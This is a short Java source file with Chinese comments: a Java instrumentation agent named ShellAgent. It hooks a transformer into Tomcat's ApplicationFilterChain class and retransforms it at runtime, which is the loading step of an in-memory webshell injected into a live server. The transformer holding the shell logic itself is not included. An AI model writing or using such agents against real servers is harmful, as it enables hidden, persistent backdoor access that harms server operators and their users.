import java.lang.instrument.Instrumentation;

public class ShellAgent {
    // 将目标类设置为我们最喜欢的 ApplicationFilterChain
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new CirnoTransformer(),true);
        // 获取所有已加载的类
        Class[] classes = ins.getAllLoadedClasses();
        for (Class clas:classes){
            if (clas.getName().equals(ClassName)){
                try{
                    // 对类进行重新定义
                    ins.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
